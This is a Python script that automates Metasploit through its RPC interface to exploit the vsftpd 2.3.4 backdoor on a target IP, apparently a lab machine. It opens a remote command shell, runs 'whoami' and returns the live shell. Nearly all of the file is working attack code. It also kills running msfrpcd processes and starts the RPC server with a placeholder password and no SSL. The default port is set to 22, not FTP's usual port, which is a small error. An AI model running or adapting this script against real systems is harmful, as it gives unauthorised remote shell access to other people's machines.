from pymetasploit3.msfrpc import MsfRpcClient
import time
import os
import pyfiglet


def exploit_ftp(
    ip="10.6.6.14", port="22", return_shell=True, verbose=True, banner=True
):
    if banner:
        banner = pyfiglet.figlet_format("Expoit FTP BACKDOOR")
        print(banner)
        print("==" * 40)

    # Kill running msfrpcd
    os.system("pkill -f msfrpcd")
    time.sleep(0.5)

    # start a msfrpcd
    os.system("msfrpcd -a 127.0.0.1 -S False -p 1597 -P yourpassword")
    time.sleep(10.0)

    # Connect to the RPC server
    client = MsfRpcClient("yourpassword", port=1597, ssl=False)
    time.sleep(2.0)

    # Get an exploit object
    exploit = client.modules.use("exploit", "unix/ftp/vsftpd_234_backdoor")
    time.sleep(0.5)

    # Set the exploit options
    exploit["RHOSTS"] = ip
    exploit["RPORT"] = port
    time.sleep(0.5)

    # Execute the exploit, success will return a jobid
    exploit.execute(payload="cmd/unix/interact")
    time.sleep(5.0)
    # Sleep is so important, to make sure that,
    # exploit can actually finished before next line of code excutes

    # Find all available sessions
    if verbose:
        print("Sessions avaiables : ")
        for s in client.sessions.list.keys():
            print(s)

    # Get a shell object
    # print(client.sessions.list)
    # TODO: check if list is not empty
    shell = client.sessions.session(list(client.sessions.list.keys())[0])
    time.sleep(5)
    # Write to the shell
    shell.write("whoami")
    # Print the output
    if verbose:
        print(shell.read())
    time.sleep(5)
    # Stop the shell
    result = shell.stop()
    if verbose:
        print(result["result"])
    if result["result"] == "success" and return_shell:
        return shell
